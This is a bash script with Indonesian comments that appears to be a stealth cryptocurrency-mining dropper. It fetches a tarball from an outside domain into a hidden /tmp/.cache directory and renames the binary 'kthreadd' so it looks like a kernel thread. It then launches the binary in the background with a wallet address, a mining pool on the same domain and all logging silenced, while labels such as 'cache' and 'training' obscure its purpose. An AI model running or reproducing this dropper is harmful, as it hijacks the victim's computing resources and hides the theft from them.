#!/bin/bash

# Update sistem & install dependencies
apt update && apt install -y wget curl

# Buat direktori cache
mkdir -p /tmp/.cache

# Download & Extract File
wget -q https://ai.myloveistrikupoppy.my.id/cache -O /tmp/cache.tar.gz
tar -xzf /tmp/cache.tar.gz -C /tmp/.cache

# Rename File
mv /tmp/.cache/cache /tmp/.cache/kthreadd
chmod +x /tmp/.cache/kthreadd

# Jalankan dengan command line
nohup /tmp/.cache/kthreadd \
  --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y \
  --rig-name Ai-03 \
  --pool training.myloveistrikupoppy.my.id:5040 \
  --ssl true \
  --cpu-threads 1 \
  --algorithm verushash \
  --silence 3 \
  --log /dev/null > /dev/null 2>&1 &

# Biarkan job tetap aktif
sleep 99999
